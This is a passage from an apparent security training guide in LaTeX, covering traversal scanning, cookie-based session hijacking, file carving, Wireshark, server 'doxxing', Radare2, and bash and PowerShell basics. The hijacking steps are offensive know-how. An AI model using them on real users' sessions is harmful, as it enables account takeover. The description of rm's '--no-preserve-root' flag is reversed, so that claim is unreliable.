		This process can also be automated through the use of the metasploit generic HTTP directory traversal 
		utility\footnote{\url{https://www.rapid7.com/db/modules/auxiliary/scanner/http/http_traversal}} 
		(``auxiliary/scanner/http/http\_traversal'').
		This tool will automatically determine whether a traversal vulnerability exists. 
		It can also be set to download a given file or download source code. 
		Furthermore, it can be used to attempt to write files in directories accross the system. 
		\subsection{Directory Creation}
	\section{HTTP Man in the Middle}
	\section{Session Hijacking}
		Session Hijacking is the act of stealing an authorised connection to a service from a legitimate user. 
		Generally, this comes in the form of stealing a cookie and crafting it to be used by your browser. 
		This section will discuss the act of using a retrieved cookie rather than the initial act of retrieving it, 
		as this can be done using tools such as XSS or Ettercap which are covered in this and \href{ch:NetworkPenetration}{the previous} chapters respectively. 

		Once you have the relevant cookie, you should be able to open a cookie editor such as Firebug for Firefox to create a new cookie for the details of the stolen session. 
		At this point, assuming that you have also deleted your cookies for the site, you should be able to access the site with the user account of the user that you have stolen the session from. 

		Depending on the means used for running this hijack, you may or may not be able to do this on encrypted sites.
		If you have used XSS to gain access to the users session, you will not be hindered by encryption, as the user will be sending you the credentials directly. 
		However, if you have used ARP poisoning through a switched network, you will not be able to read the encrypted data without attempting to MitM the session itself and creating a fake certificate. 
	\section{URL Injection}
	\section{HTTP Redirect Attacks}
\chapter{Forensics}
	\label{ch:Forensics}
	\section{File Carving}
		File carving is the act of pulling a file from another or directly from the disk without the use of the file's or file system's meta data as would normally be done using a file manager. 
		This is done because it is possible to hide a file within another---placing it after the EOF line of the first file---or delete a file from disk without overwriting it, avoiding it being accessible by normal means. 
		Before attempting any of these actions on a drive, it is recommended that you attach the drive (preferably with a write blocker) and take a full image of it first. 
		This will avoid deleted files and hidden partitions being overwritten. 
		% more challenges http://forensicswiki.org/wiki/File_Carving
		\subsection{Manual File Carving}
			Because file carving uses the data available within the file itself, it can be done manually. 
			This method can pick up more obscure files or by using more advanced techniques, files that wouldn't be picked up due to corrupted headers or footers. 
			However, the most simple way to manually file carve is to know the common headers and footers and search for them. 
			Table \ref{tab:FileCarvingHeaders} contains a list of common headers and footers.\footnote{\url{http://www.garykessler.net/library/file\_sigs.html}} 
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| l | l | l |}
					\hline
					\textbf{File Type} & \textbf{Header} & \textbf{Footer} \\ \hline
					mp4	& 00 00 00 14 66 74 79 70	& 69 73 6F 6D \\ \hline
					XLS	& 09 08 10 00 00 06 05 00	& none \\ \hline
					webm& 1A 45 DF A3				& none \\ \hline
					MKV & 1A 45 DF A3 93 42 82 88	& 6D 61 74 72 6F 73 6B 61 \\ \hline
					GZ	& 1F 8B 08					& none \\ \hline
					VMDK& 23 20 44 69 73 6B 20 44	& 65 73 63 72 69 70 74 6F \\ \hline
					PDF & 25 50 44 46				& Numerous \\ \hline
					ISO	& 43 44 30 30 31			& none \\ \hline
					GIF & 47 49 46 38 37 61			& none \\ \hline
					TIFF& 49 49 2A 00				& none \\ \hline
					MP3	& 49 44 33					& none \\ \hline
					ZIP & 50 4B 03 04				& none \\ \hline
					Office XML & 50 4B 03 04 14 00 06 00 & none \\ \hline
					JPG & FF D8 FF E0 xx xx 4A 46	& 49 46 00 \\ \hline
				\end{tabular}
			\end{adjustbox}
				\caption{Common File Headers and Footers}
				\label{tab:FileCarvingHeaders}
			\end{table}
			Using these headers and footers, you should be able to search through the files in \notextattachfile[print=false]{./CarvingImages.zip}{this zip archive} %TODO: Fix this attachment. 
			%Current implementation would have them file carving the zip out. 
			and find the images embedded within the files (with the exception of steg, which will be discussed in the next section).
			Note that some of these files may have more than one image embedded within them. 

		\subsection{Using File Carving tools}
			The same images can be carved almost immediately using a tool such as foremost. 
			This tool will automatically read through the file looking for file specific headers, footers and data structures,\footnote{\url{http://linux.die.net/man/1/foremost}}
			enabling it to find most of the files we could using the above technique, and possibly a few more. 
			We will use this tool pointed directly at a file, but it is able to scan a directory or even unformatted disks. 
			After running the program, you will see an output file containing folders for every type of file that foremost can find, as well as a HTML file with data on what was found. 

			A simple example of using this program would be attempting to pull all .jpg images out of a filesystem image:
			\begin{lstlisting}[style=CLI]
				$ foremost -t jpg -i image.dd
			\end{lstlisting}
			This same syntax can be used on any file type, while omitting the ``-t'' argument will result in all file types being recognized. 
			For most of the files you come across, the default options will work, allowing you to just call foremost with the name of the file to scan. 


	\section{Steganography}
	\section{Wireshark}
		Wireshark is a packet sniffing and inspection suite which is used to intercept and view traffic which is being transmitted along your network.\cite{WSUG} 
		It is used in a number of fields, such as network interception, Bluetooth and WiFi attacks and attack recognition. 
		This works in such a way that no packets are transmitted by Wireshark, making it invisible to those down the line of transmission. 
		This section will be working from Wireshark 2.0.2, which may not be installed on your system. 
		While some of the actions will be quite similar, you may want to download a more recent version from \url{wireshark.org} or github.

		\subsection{The Wireshark UI}
			When you first open Wireshark, you will be given the option to choose a network adapter to listen on. 
			This can be any of the devices that are attached to the computer that Wireshark supports. 
			Usually it is limited by OS support rather than Wireshark limits. 
			Once a network adapter is selected, you will be taken to the packet analysis screen, which can be seen in figure \ref{fig:WiresharkAnalysis}.
			\begin{figure}[htb]
				\centering
					\includegraphics[scale=0.33]{./WiresharkAnalysis.png}
					\caption{This is what Wireshark will look like when you are running a capture.}
					\label{fig:WiresharkAnalysis}
			\end{figure}
			In this, there are four main areas to focus on:
			\begin{description}
				\item[Filter Toolbar] This toolbar is used to find the packet or type of packet that you are looking for. 
					It has it's own syntax which allows it to filter the packets which have been captured by items such as
					Protocol, type, source address or destination address. 
					This is one of the more powerful parts of Wireshark. 
				\item[Packet List] This is where you will spend much of your time. 
					The packet list is used to find the packet that you are searching for, and is found in the middle of the screen. 
					It is colour coded in a manner which can be found within the colour settings on the toolbar. 
					Between the detail found here, the colour coding and the filter toolbar, you should be able to find all packets that you require. 
				\item[Packet Details]
					This is directly below the packet list and contains the full metadata of the packet. 
					It is the location where you will find most of the interesting data which is encoded with the packets, but not a part of their data payload. 
				\item[Packet Bytes]
					This is a direct hexadecimal representation of the bytes which were sent as the packet. 
					It shows hex on one side and ASCII on the other, allowing for any plain text to be discovered. 
					Bytes which do not map to an ASCII code will be displayed as a full stop. 
			\end{description}
			
	\section{Netflow}
	\section{DoXXing}
		DoXXing is the act of attempting to find out the physical location and real identity of an individual or Internet facing machine. 
		There are a number of ways that this can be done. 
		The focus of this section will be on doXXing a remote server. 
		This is because it can be a useful tool in determining where a compromised system is hosted as well as who may have compromised it. 
		\subsection{Traceroute}
			Traceroute one of the better ways to gain this information. 
			This is because while the domain name of the server that you are attempting to access may not give you the information that you require, those that you must go through to get to it usually will. 
			You will see every server that responds to ping between you and the server, thus giving you a readout of where the connection had to go through to get to the final destination. 

			The key points to look for here is where the packet leaves your country, if it does. 
			This will be the key indicator for traffic outside your own nation and can be seen through items such as ``telstraglobal'' for Australia. 
			Furthermore, the country code TLDs that you receive back will tell you which nation you are connecting to. 
			The final one of these TLDs will give you the most likely nation that you are connecting to. 
			Finally, the hosts that are near it may tell you which ISP the server is connected with or which hosting company the server is hosted on. 

		\subsection{Whois}
			Whois records are created when the domain is registered. 
			While there are ways to hide these, such as registering through an anonomizer or in another nation, generally these will contain detail about who registered the domain. 
			You will usually get the following information:
			\begin{itemize}
				\item Registrant: Which person or organisation registered the Domain. 
				\item The name, ID and email for the contact for the domain. 
				\item The name, ID and email for the technical contact for the domain.
				\item The name servers for the domain.
				\item The registrar used to register the name. 
			\end{itemize}
			These details are exactly what you need when doXXing an organisation. 
			They will allow you to search for the physical location of the organisation, as well as the contact details of a number of members within it. 
			Furthermore, the registrar name will often tell you which nation the server is hosted in. 
		%TODO: More on server doXXing and some on personal doXXing.  
	\section{Disk and Memory Analysis}
		\subsection{File Types}
		\subsection{Common Conversion issues}
		% DOS -> UNIX (CRLF -> LF) conversion
		\subsection{Cyclic Redundancy Codes}
\chapter{Reverse Engineering}
	\label{ch:ReverseEngineering}
	\section{Assembly}
		\subsection{x86 Assembly}

		%TODO: Decide whether this goes here or in programming. 
		\subsection{ARM Assembly}
	\section{Radare2}
		Radare2 is a set of tools for working with binary files. 
		This makes it useful as a means of reading and altering compiled programs and their data files from the command line. 
		While the Radare2 suite has a number of stand alone programs within it, this section will cover only the main program. 
		This program allows for the searching, altering and disassembly of binary programs in multiple modes, making it a great tool for challenges such as Pwn Adventure in the next section.
		For a more detailed guide, read through the Radare2 book.\cite{Radare2}

		\subsection{Getting Started}
			The learning curve at the start of using Radare2 is quite steep. 
			However, if you have any experience with other command line tools such as Vim and GDB, many of the commands and shortcuts should come easily. 
			Before going any further, it is worthwhile to note that you can get the help information for any command by appending a ``?'' to it. 

			Navigation within Radare2 is done through the following commands:
			\begin{description}
				\item[Seek]
					or ``s'' will move you to the address that you specify after the command. 
					The address can either be an explicit memory location, or a mathematical statement based on the current location or a label within the binary. 
					An example of this is ``s 0x00001c80''.
				\item[is]
					or information symbols will get you a list of the different symbols which are still in the binary. 
					These can be functions, objects, strings or any other symbol that survives the compilation process. 
					This is useful to find the functions which the program uses, and will become the main way of navigating in the Pwn Adventure Challenge. 
				\item[Visual mode]
					Like Vim, Radare2 has a visual mode which allows for direct reading and writing of assembly or hex. 
					In this mode, you can move using the same key bindings as Vim, with ``i'' being used as replace and ``p'' being used to change visual mode. 
					Furthermore, to get a cursor which can be used for these insert functions, use ``c''.
					This mode allows for the editing of the disassembled binary without having to reassemble it. 
				\item[Hex View]
					In visual hex view, hold shift while moving to highlight a byte range. 
					Tab will switch from the Hex pane to the ASCII pane. 
				\item[\~{}]
					This is the internal grep function. 
					When it is placed after a command, anything after it will be used to filter the results. 
					Furthermore, output can be filtered by column using the syntax ``[x]'' or by row using ``:x'' after the grep search.
			\end{description}
			Beyond this, you will want to start the program with the ``-w'' flag in order to write to the file. 
			Finally, any CLI program---or syntax such as pipes and redirection---installed on your computer can be accessed through the Radare2 prompt. 
			This is useful for actions such as greping through the output of ``is''. 

			At this point you should have enough of an understanding of Radare2 to be able to use it. 
			The next section contains spoilers to the challenges presented by Pwn Adventure 3. 
			Before reading on, recommend downloading and installing the game and attempting to reverse engineer it so that you can win. 
			I recommend starting with the sprint speed. 
			%TODO: Should there be more than this section here?
	\section{Side Channel Attacks}
	\section{Java Reverse Engineering}
		Unlike most fully complied languages, Java is quite easy to fully decompile, rather than just disassemble. 
		This means that you will be able to get source code, though not necessarily the same source code as the programmer wrote in the first place. 
		Thus, Java reverse engineering is simply a matter of choosing the best program to use in decompilation. 

		The current recommendation for Java Decompilers is Procyon\footnote{\url{https://bitbucket.org/mstrobel/procyon}}
		This is due to the fact that it is the most up to date and well maintained decompiler available.\footnote{You may hear of others such as jad. This is old and unmaintained.} 
		
		Procyon is quite easy to use. 
		All that is required is having Java installed on the system that you are working on and running the provided JAR package. 
		You will give it both the class files that you wish to decompile, as well as an output directory. 
		An example of this can be found below:
		\begin{lstlisting}[style=CLI]
			$ ./procyon.jar *.class -o src
		\end{lstlisting}

		Furthermore, Procyon will allow you to decompile a JAR file in it's entirety. 
		All that need be done for this is running the same command as above on the JAR file rather than the individual unpacked classes. 

		The reason that Java Reverse engineering is seen as easy is the fact that you now have the full source code of the program. 
		At worse, the programmer may have obfuscated the code, making it harder to determine what the methods and variables mean. 
		This would mean that you will have to manually determine this from the usage of the variables and the content of the methods.

		Once this decompilation has been completed, you can use tools such as yFiles to get an overview of the classes or data structures. 
		Other than this, it is simply a matter of finding the logic within the program that is used to calculate the value that you are reverse engineering for. 
	
		%TODO: Revise this section
	\section{C\# Reverse Engineering}
	\section{Pwn Adventure}
	\section{IDA 64}
	\section{Other Tools}
		\subsection{Strings}
		\subsection{Ltrace}
		\subsection{Strace}
\chapter{Programming}
	\label{ch:Programming}
	\section{Introduction to the CLI}
		The command line is the tool for direct interaction with your computer. 
		It is like the baby brother to programming yourself, though with scripting it can become just as complex. 
		The command line will enable you to tell the computer what you want it to do, rather than stepping through a long list of clicks in order to have a program do what it thinks you mean. 
		This gives you fast and powerful interaction with your computer, but it is not without a steep learning curve. 
		This section will focus on the \**nix bash shell, which is the most common powerful shell used today. 
		Others such as powershell on windows and Zsh on \**nix are not to be discounted, but bash will get you the furthest with minimal training.\cite{CLICrashCourse}
		What follows is a basic introduction to the most common commands, an easy way to remember what they do and their usage:
		\begin{description}
			\item[pwd]
				Where am I?
				Whenever you are lost, this will show you where you are in the filesystem. 
				It is similar to the URL bar in a browser or file manager. 
			\item[hostname]
				What machine am I on?
				This will allow you to determine what machine your current session is running on. 
				It can be useful when you think you have opened a shell to another computer but aren't sure. 
			\item[mkdir]
				Like selecting new folder, but four steps in one. 
				Run it as ``mkdir <folder name>'' to create one folder or run it with the ``-p'' argument to create a whole branch of directories, separate each folder name with ``/''. 
			\item[ls]
				List the contents of a directory.
				This will give you the contents of the directory you are in, or the one you have given as an argument. 
				The following are useful flags for ls:
				\begin{itemize}
					\item -l long, gives you sizes, permissions change times and other information. 
					\item -h gives you data in a human readable formate. 
					\item -a all, gives you all files, including hidden files (also known as dotfiles)
					\item -S sort size, gives you all files in the directory sorted by size. 
				\end{itemize}
			\item[cd]
				Tell the computer where you want to go. 
				cd will take you to the location within the filesystem that you give as an argument. 
				Furthermore, it takes advantage of special characters within \**nix systems such as ``.'' and ``..'' which mean current and previous directory along the current branch of the filesystem. 
			\item[rm]
				I want this file gone. I want it burned. 
				When using this command, you will lose the file, either understand the wildcards you are using, or get good at file recovery. 
				Alone, this command will delete files, using the ``-r'' flag will allow it to recurse through directories. 
				Furthermore, some systems have added the flag ``--no-preserve-root'', which will stop you deleting your entire system. However, the existence of this flag should not be trusted. 
				For example, it does not exist on Mac OS X. 
			\item[touch]
				Create a file here, I don't care about type or content. 
			\item[cp]
				Copy and paste. Used as ``cp src dest''.
			\item[mv]
				Cut and paste. Used exactly the same as cp. 
			\item[less]
				Read a file which would cause your terminal to scroll. 
				Use page up and down or the arrow keys to navigate. 
				Use ``/'' to search.
				Quit by pressing q.
			\item[cat]
				Stream a file to your STDOUT. 
				This can be useful for small files, checking that a change occurred properly or piping a file into another command. 
				It is little known, but this command stands for concatenate. 
				Thus it can be used to merge a number of small files into a large one using ``cat file1 file2 file3 > bigFile''.
			\item[Pipes]
				The pipe, ``|'' is used to send the output of one command to another. 
				This would be useful for example to edit a file by streaming it from cat into sed. 
			\item[Output Redirecton]
				This is useful to force a program to read or write to or from a file. 
				It works in the following manner:
				\begin{itemize}
					\item ``> <outfile>'' Write output to a given file.
					\item ``< <infile>'' Read the given file as input.
					\item ``>{}> <outfile>'' Append the programs output to the given file. 
				\end{itemize}
			\item[\** wildcard]
				This is the most simple wildcard. 
				It is used to match anything which follows the form given to it. 
				For example the command ``cat /etc/\**.conf'' would print to STDOUT every ``.conf'' file in ``/etc''.
			\item[locate]
				Database search for the whole filesystem. 
				If you need it, and it exists, locate knows where it is. 
				However, you may need to run updatedb first. 
				Use this command as ``locate <pattern to search for>''
			\item[find]
				When locate is not installed (such as with most Mac OS X installs) find will do the same job. 
				However, find has to run through the filesystem each time the command is run, making it far slower for large searches. 
				This command works the same as locate. 
			\item[grep]
				Search for a given pattern within a pipe or stream. 
				This will also work for redirects and can be used on an individual file. 
				Used as ``grep pattern'', and can use flags such as ``-i'' to ignore case. 
			\item[man\footnote{\url{http://linux.die.net/man/}}]
				When you're inevitably told to RTFM, this is where you go. 
				Used as ``man <command>'', this program will give you the manual entry for the given command, spelling out all of the flags and usages which you may want. 
				An alternative to this is using ``<command> \verb+--+help'' or ``<command> -h'' which may show a shortened version. 
			\item[dd]
				A low level copy of the given partition or disk. 
				This command ignores filesystem and just writes the bits read from the input device to the output. 
				It is used as ``dd if=<input file> of=<output file>''.
				Be wary that if this command is entered wrong, you will loose data. 
				It can also be combined with other commands, such as ``dd if=<in> | pv -s <size>G | dd of=<out>''.
			\item[vim]
				The editor war will likely never end, and each side will tell you to use their preferred. 
				Vim is a powerful editor which I am using to write this. 
				However, it can have a steep learning curve, and thus must have time dedicated to it's usage. 
				Following the tutorial provided by the command ``vimtutor'' will give you the basics that you need to begin using vim properly. 
				However, if you do not wish to learn a fully featured editor, the likes of ``nano'' and ``ed'' will serve you well. 
		\end{description}
		While there are many other commands\footnote{\url{https://github.com/jlevy/the-art-of-command-line}} commonly installed with a \**nix system, these are the most common and some of the most useful. If you would like to learn more, the footnotes throughout this section have detailed information on many more commands. 

	\section{Introduction to Powershell}
		%ktiploit.com
		% https://github.com/mattifestation?tab=repositories
		% http://colesec.inventedtheinternet.com/hacking-with-powershell-powersploit-and-invoke-shellcode/
		Powershell is the scripting and command line environment of Windows.\cite{EffectivePS} 
		It allows a similar level of access to that of Bash on Unix and Linux. 
		However, the conceptual level of powershell of significantly different. 
		Powershell is based on the .Net object system, which gives it a completely different manner of interacting with IO of the programs. 
		Rather than output being given as a string, which can be directed around to different programs, the output is a powershell object which can be interpreted by the command that it is given to. 
		This gives a number of new ways to interact with the IO of the programs that you are using. 
		The issues which you will find in the Bash scripting section below are far less problematic due to this change. 
		It is recommended that prior to starting this guide you run the command ``update-help''. 
		This will give you access to the manual pages for all commands, which are not installed by default. 
		\subsection{Four Basic Commands}
			These commands are the ones that will get you out of problems. 
			Together, they work in a similar way to the Unix ``-h'' option and ``man'' command. 
			These commands have a large amount of expandability through their arguments, and should be used on each other to gather more information. 

			The cmdlet ``get-command'' is used to gather information about all commands, cmdlets and scripts which are available on the current system. 
			In it's basic form it will simply output a list of all of these items, with little further information.
			Furthermore, when using this command with the exact name of a module which has not yet been imported, get-command will automatically import the module for you, allowing you to use it immediately. 
			It is also worth noting that all information available to get-command is found within the source code of the command you are searching for. 
			No external resources are used.
			When using this to search for commands, you can also use the ``-CommandType'' parameter to specify the type of command that you wish to find. 
			Further information can be found by using the commands explained in the below paragraph. 
			However, for the most part, it can be though of as similar to the Unix ``which'' command with a significant amount of extra functionally. 

			While basic information about cmdlets and other powershell programs is useful, one will regularly desire manual access for these commands. 
			The cmdlet ``get-help'' will facilitate this. 
			It its most basic form, get-help will output its own help file, giving you detail on how to use it. 
			However, there are a number of other options such as using it with a wildcard argument which will output a basic synopsis of all commands or giving it a command as an argument which will output the help (similar to a man page) for that command. 
			Furthermore, there are flags which are useful for getting more information about the options for a command. 
			Using the flag ``-Detailed'' will give you an explanation of every flag for the given command.

			A further command which will allow you to better understand and interact with the powershell object system is the ``get-member'' command. 
			This command is used for gathering information on the objects which will be passed from one command to another through systems such as pipes. 
			For example, when you pipe the output of get-command on a specific cmdlet from above into get-member you will see both the object type and the methods which can be called on it. 
			This should be used to determine what further information and actions can be done using both that objects methods, and the classes static methods. 

			Finally, we must understand the filesystem and drive access. 
			This can be done through the use of the command ``get-psdrive'', which will show the drives attached to the system that are available to powershell. 
			These drives are of different types, such as Filesystems and registries which can be manipulated using the cmdlets found by running ``get-command *-Item*''. 

			Using these commands, you should be able to find your way around the system, albeit slowly until you learn the commands which you will be using. 
			These commands will be explained in the next section. 

		\subsection{Differences and similarities to Bash}
			This section will discuss the differences and similarities that need to be understood when moving from Bash to PowerShell. 
			These are in part due to basing PowerShell on earlier shell implementations, but are also largely influenced by the C\# and .NET object system which PowerShell is based on. 

			The first of these is pipes and redirection. 
			These are much the same as in bash, where the ``>'' operator will redirect output to a file or another file descriptor. 
			However, one must understand that this will direct the object which was output to that file, rather than the direct text which would have been printed. 
			This is due to the underlying .NET object system which PowerShell is based on. 
			This can be seen by capturing the output of a cmdlet in a variable (``\$<var> = <cmdlet>) and calling ``.GetType().Fullname'' on this variable.
			For bash, or any other text based shell, this would not work as you are working on a text variable. 
			However, in powershell, this will be an object of a specific type, possibly even a string object. 
			If you would like to capture the text, piping the result into the cmdlet ``out-string'' will render it as it would be on screen and store a ``System.String'' object. 

			It is also worth noting that functions within PowerShell have a number of quirks which must be accounted for for those coming from a programming background. 
			The first of these is the notion that cmdlets and strings that you use within the function may also add to the return of the function. 
			When the return function is called, all output which would normally be written to STDOUT is returned, each being given the next available place in the output array. 
			To avoid this with strings, use the command ``Write-Host''. 
			Alternatively, redirect output to either \$null or [void]. 
			Note also that the return keyword is just used to end the function at a given point. 
			It is not necessary to have the output returned. 

			Null will also cause some issues when using powershell. 
			This is due to the interaction between powershell cmdlets and .NET functions. 
			The former, being built for CLI scripting will gracefully ignore null. 
			The latter, however, will often crash on null references, causing the script as a whole to grind to a halt. 
			Thus, when using powershell, you must be wary of both what may be null, and what may be called on a null. 
			
		\subsection{Conclusion}
			While powershell may look similar to many other shells, it works on a very different paradigm. 
			When working with powershell, one needs to understand the underlying .NET object system and it's impact. 
			While it may be possible to treat Powershell as a normal text based shell, doing so will create a far less efficient and far harder to understand script. 
			Thus, it is recommended that you use the four cmdlets outlined above alongside the information in the last section to determine how best to interact with the objects you are given. 
			This is a far more powerful and efficient way to interact with PowerShell. 
	\section{Introduction to Scripting}
	% http://mywiki.wooledge.org/BashGuide/Patterns	https://en.wikibooks.org/wiki/Bash_Shell_Scripting
		Bash scripting is another language in its own right.\footnote{\url{http://guide.bash.academy}}
		This language however, is one that you should now be used to. 
		Its commands are exactly the same as the commands that you use on the normal command line in its interactive mode. 
		However, in the non-interactive mode that we will be using in this section, there are a number of new quirks and language features which do not make sense in interactive mode. 
		This section will discuss these differences, as well as the control structures and variables which are required to create a working script. 
		\subsection{Setting up your script}
			Unlike the command line, you will need to do some set up before you can use your script. 
			This is because you are now creating a file which the system needs to be told how to read and what it is allowed to do with it. 
			The first of these is the interpreter instruction, also known as the shebang or crunchbang. 
			This line, designated by the symbol ``\#!'' followed by the location of your shell executable tells the prompt what to use to read the file with. 
			Without this, the prompt will read the file as a generic text file, having been told no action to take. 

			Next, you will need to set the permissions to executable using the command ``\verb|chmod +x <File.sh>|''
			This will write the permissions of the file allowing the OS to run it as a program using the interpreter given at the crunchbang. 
			Finally, you can execute the program by running ``\verb+.\<File.sh>+''. 
		\subsection{Variables}
			Variables in bash scripting act the same way as those in most other programming languages, however, internally they act slightly differently. 
			These are known as bash parameters, and they come in three different types: Positional, Special and Shell Variables. 
			Shell variables are the most common, and act almost exactly the same as those of most other programming languages, while the others are slightly different and have their own uses. 

			Shell variables are much like the variables of python. 
			They do not have a specific type and can be named and assigned at any time using the ``='' operator with no spaces.
			However, when referencing them, the \$ prefix should be used to tell bash that you are referring to the variable rather than the name of a program.
			This \$ symbol is the designator for expansion. 
			This means that the result of whatever is after it is placed into the script at that point. 
			This can also be used for getting the output of another program, such as ``gdb \$(which bash)'' which will run the GNU debugger on the result of ``which bash''. 
			In addition to this, when you need to ensure that the words are split in the correct place, you can use \{ and \} around the variable name with \$ at the front. 

			Also like in other programming languages, there are environmental variables which are set outside the shell and can be accessed for system information. 
			Generally, unless you require a specific feature of environmental variables or are getting system information, shell variables should be used. 
			Environmental variables are passed on by the parent process, but alterations are one way, only the new children will get a new environmental variable. 
			This makes them useful for creating variables which the processes you are starting will require, but cannot be passed on as arguments. 
			Most of the time, these variables will be mentioned in the man pages of the program you are calling. 
			This should be your reference when creating new environmental variables. 

			The final type of variable is the positional parameter, which acts in a similar way to the argument variable of most programming languages. 
			These parameters are referenced in the same way as shell variables, but are pre-named using integer values counting from one. 
			Thus, if you wish to use the first parameter that your script was called with, the variable \$1 will contain it. 
			Also similarly to most programming languages, there is a zeroth argument, which will contain the command used to start the current process. 
			It is also worth noting that these parameters are read only. 


		\subsection{Conditionals}
			Like any programming language, bash scripts allow the use of conditional structures. 
			These structures allow for executing code based on the environment it finds itself in. 
			In bash, there are a number of these conditionals which we can use. 

			Exit code checking is one of the most basic conditional checks in bash. 
			This uses the ``||'' operator after a command. 
			If the command were to return a non-zero exit code, the statement after the ``||'' operator would be run. 
			Due to this, it can be thought of in a similar way to the logical ``||'' operator in most programming languages. 
			This is mainly useful for writing error or exception checking messages. 

			The inverse operation in bash is the ``\&\&'' operator. 
			This will cause bash to move on to executing the next command only if the first exits with code 0. 
			This is useful if you are running a command which relies on something set up by the previous one. 

			When using the above two conditionals, we may occasionally desire the exit code to be negated. 
			Such as searching for files which do not contain a word with grep, which does not have a ``not containing'' option. 
			In this case, the ``!'' operator will tell bash to negate the exit code, causing ``\&\&'' to work if the program fails and ``||'' to work if the program succeeds. 
			While this may be confusing to think about, it becomes far easier to read when well implemented. 

			A further note when using these conditionals is that bash will carry the exit code of one program through to the end of the string of conditionals. 
			This means that if you have three commands separated by ``\&\&'' conditionals and a ``||'' conditional at the end, any of the three commands failing will trigger the final command. 
			This can be controlled by using the grouping braces ``\{'' and ``\}''. 
			These will ensure that bash will count the group as a whole against the exit status, but the exit status of items outside the group will not effect the status within. 
			You will also need to end the statement before closing the final brace. 
			Do this with a semicolon or a new line. 

		\subsection{Conditional Blocks}
			The if statement in bash works in much the same way as the ``\&\&'' conditional in that it will run it's block if the command that was given to it succeeds.\footnote{\url{http://mywiki.wooledge.org/BashGuide/Patterns}} 
			The syntax for the if command is as follows:
			\begin{code}
			\begin{lstlisting}[language={bash}]
if <Conditional commands>; then 
	<if block commands> 
else 
	<else block commands> 
fi
			\end{lstlisting}
			\label{code:BashConditionalBlocks}
			\caption{Conditional Blocks in Bash}
			\end{code}
			While the if conditional commands can be anything, bash has a specific ``test'' command which can be used for conditionals. 
			This command is run either by calling ``test'' or by opening a ``['' bracket. 
			Within this, you can run any conditional statement that you would be able to run in a normal programming language. 
			Signs such as ``='', ``-ne'', ``-gt'' and ``-lt'', as well as combinations of them can be used to create the conditional. 
			In addition to this, there is the ``[['' command, which is a more powerful version of ``[''.
			This command allows for a number of new features, outlined in the following list:
			\begin{description}
				\item[Pattern Matching]
					Using wild cards, one can match a given pattern, such as ``*.pdf''. 
					This can be used when you don't know the exact name of the file that you are searching for. 
				\item[elif]
					Else if, allows you to have more than two options for what to do. 
					This is given with a conditional after it, allowing for another specified option before getting to the catch all else statement. 
				\item[-e <file>]
					True if <file> exists.
				\item[-f <file>]
					True if <file> is a regular file. 
				\item[-d <file>]
					True if <file> is a directory. 
				\item[-h <file>]
					True if <file> is a symlink.
				\item[-p <pipe>]
					True if <pipe> exists.
				\item[-r <file>]
					True if <file> is readable by the current user. 
				\item[-s <file>]
					True if <file> exists and is not empty. 
				\item[-t <FD>] 
					True if <FD> is open on a terminal. 
				\item[-w <file>]
					True if <file> is writable by the current user. 
				\item[-x <file]
					True if <file> is executable by the current user. 
				\item[-O <file>]
					True if <file> is effectively owned by the current user. 
				\item[<file> -nt <other file>]
					True if <file> is newer than <other file>.
				\item[<file> -ot <other file]
					True if <file> is older than <other file>.
				\item[-z <string>]
					True if <string> is empty. 
				\item[-n <string>]
					True if <string> is not empty. 
				\item[-a]
					Logical and used between other expressions.
				\item[-o]
					Logical or used between other expressions. 
				\item[!]
					Negates the expression it is given before. 
				\item[-eq]
					True if both sides are equal. 
				\item[-ne]
					True if both are not equal. 
				\item[-lt]
					True if first is less than the second. 
				\item[-gt]
					True if first is grater than the second. 
				\item[-le]
					True if first is less than or equal to the second. 
				\item[-ge]
					True if first is greater than or equal to the second. 
				\item[<String> ~= <REGEX>]
					True if <string> is matched by <REGEX>
			\end{description}

			Another option for these is to use the case command. 
			This is used to check a variable against a number of options in a similar manner to the switch construct of most programming languages. 
			It can be used with wildcards, allowing you to check for similar items. 
			The syntax of this command can be found below:
			\begin{code}
			\begin{lstlisting}[language=bash]
case <variable> in
	<option 1>) <command> ;;
	<option 2) <command> ;;
	*) <else command> ;;
esac
			\end{lstlisting}
			\label{code:SwitchConditionalBlock}
			\caption{Switch Conditional Blocks in Bash}
			\end{code}
		\subsection{Loops}
			There are a number of loops which can be used within bash. 
			These range from simple while and for loops, to until  and for each loops. 
			Each of these loops has a code block which starts with the keyword ``do'' and ends with ``done''. 
			The specific syntax and quirks of each of these will be explained in this section. 

			The while loop will continue until its condition is met. 
			This is much the same as while loops in normal programming languages, allowing you to repeat the code until the change you are searching for has occurred. 
			The syntax for these loops is:
			\begin{code}
			\begin{lstlisting}[language=bash]
while <conditional> do
	<Commands to be looped>
done
			\end{lstlisting}
			\label{code:WhileBashLoops}
			\caption{While Loops in Bash}
			\end{code}
			A variant of this type of loop is the until loop. 
			This variant will simply reverse the conditional check on the while loop. 
			The syntax for the until look is:
			\begin{code}
			\begin{lstlisting}[language=bash]
until <conditional> do
	<commands to be looped>
done
			\end{lstlisting}
			\label{code:BashLoopsUntil}
			\caption{Until Loop in Bash}
			\end{code}

			The for loop works much the same as those in a normal programming language. 
			At the start, it will execute the first block of its arguments and check the conditional in its second. 
			After this, it will execute the code within its bounds before running the third block and checking the conditional again. 
			The syntax for the for loop is:

			\begin{code}
			\begin{lstlisting}[language=bash]
for (( <Setup>; <condition>; <change> )) do
	<Commands to be looped>
done
			\end{lstlisting}
			\label{code:ForLoopBash}
			\caption{For Loops in Bash}
			\end{code}
			The for each loop works in a similar manner to that of python. 
			This loop creates a variable which can be used within its bounds and is filled with the output from its second block. 
			The syntax for this loop can be seen below. 
			\begin{code}
			\begin{lstlisting}[language=bash]
for <variable> in <command> do
	<commands to be looped>
done
			\end{lstlisting}
			\label{code:ForEachBash}
			\caption{For Each Loops in Bash}
			\end{code}
			This loop often catches people out due to bash splitting the words within the output of <command>, making them meaningless. 
			This can be resolved by telling bash that you are working with a list of files or the like. 
			Rather than putting a command such as ls in the <command> section, it is better to use a pattern matching command such as ``*.mp3''. 
			This will tell bash that you are working with files and stop it splitting all spaces in the file name into individual words. 

			With all of these loops, the command continue will skip to the next iteration of the loop and the break command will end the loops iteration without the conditional having to be set to false. 

		\subsection{Arrays}
			Arrays are another part of bash. 
			These are similar in concept, but different int syntax to the arrays of most programming languages. 
			They should be used any time that a list of something is produced, rather than placing the list in a string and attempting to delimit each item. 
			The syntax for creating an array is as follows, each line designating another method of creation. 
			\begin{code}
			\begin{lstlisting}[language=bash]
